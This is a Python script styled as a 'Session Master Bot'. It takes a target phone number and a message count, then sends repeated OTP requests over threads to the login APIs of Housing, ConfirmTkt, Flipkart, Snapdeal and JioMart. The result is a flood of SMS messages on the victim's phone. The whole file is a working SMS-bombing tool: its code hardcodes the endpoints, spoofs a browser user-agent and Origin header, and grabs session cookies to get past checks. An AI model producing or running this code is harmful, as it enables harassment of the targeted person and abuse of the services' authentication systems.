import requests
import os
import time
import threading

# --- COLORS ---
G = "\033[92m" # Green
R = "\033[91m" # Red
Y = "\033[93m" # Yellow
W = "\033[0m"  # White

success_count = 0
failed_count = 0

# --- 1. SENDER LOGIC WITH SESSION ---
def send_otp(api_name, target, session, headers):
    global success_count, failed_count
    try:
        # Har site ka apna logic
        if api_name == "housing":
            url = "https://login.housing.com/api/v2/send-otp"
            res = session.post(url, json={"phone": target}, headers=headers, timeout=10)
        
        elif api_name == "confirmtkt":
            url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={target}&newOtp=true"
            res = session.get(url, headers=headers, timeout=10)

        elif api_name == "flipkart":
            url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
            res = session.post(url, json={"loginId": "+91" + target}, headers=headers, timeout=10)

        elif api_name == "snapdeal":
            # Step 1: Snapdeal ke liye pehle main page hit karna zaroori hai (Cookies ke liye)
            session.get("https://m.snapdeal.com/signin", headers=headers, timeout=5)
            # Step 2: Ab OTP request (Aapne jo URL dhunda tha)
            url = f"https://m.snapdeal.com/resendOtp?mobileNumber={target}"
            res = session.get(url, headers=headers, timeout=10)

        elif api_name == "jiomart":
            url = "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp"
            # Note: JioMart bina Bearer Token ke 401 error dega.
            # Agar aapke paas fresh token hai toh yahan headers mein update kar sakte hain.
            res = session.post(url, json={"mobile": target}, headers=headers, timeout=10)

        # Result Check
        if res.status_code in [200, 201]:
            success_count += 1
            print(f"{G}[+] SUCCESS: {api_name} sent!{W}")
        else:
            failed_count += 1
            # print(f"{Y}[-] {api_name} failed: {res.status_code}{W}")
    except:
        failed_count += 1

# --- 2. MAIN INTERFACE ---
def main():
    os.system("clear")
    print(f"{G}========================================")
    print("      🚀 SESSION MASTER BOT v18.0     ")
    print(f"========================================{W}\n")
    
    target = input(f"{G}Enter Target Number: {W}")
    limit = int(input(f"{G}Enter SMS Limit: {W}"))
    
    # Common Headers
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.google.com"
    }

    # Session object banana (Ye browser tab ki tarah kaam karega)
    bot_session = requests.Session()

    print(f"\n{Y}[*] Initializing Session Attack on {target}...{W}\n")
    
    apis = ["housing", "confirmtkt", "flipkart", "snapdeal", "jiomart"]
    
    sent = 0
    while sent < limit:
        threads = []
        for api in apis:
            if sent >= limit: break
            t = threading.Thread(target=send_otp, args=(api, target, bot_session, headers))
            t.start()
            threads.append(t)
            sent += 1
            time.sleep(0.3)
        
        for t in threads: t.join()
        time.sleep(1) # Gap to keep session alive

    print(f"\n{G}--- FINAL REPORT ---")
    print(f"Successfully Sent: {success_count}")
    print(f"Failed/Blocked   : {failed_count}")
    print(f"====================={W}")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n{R}Stopped.{W}")
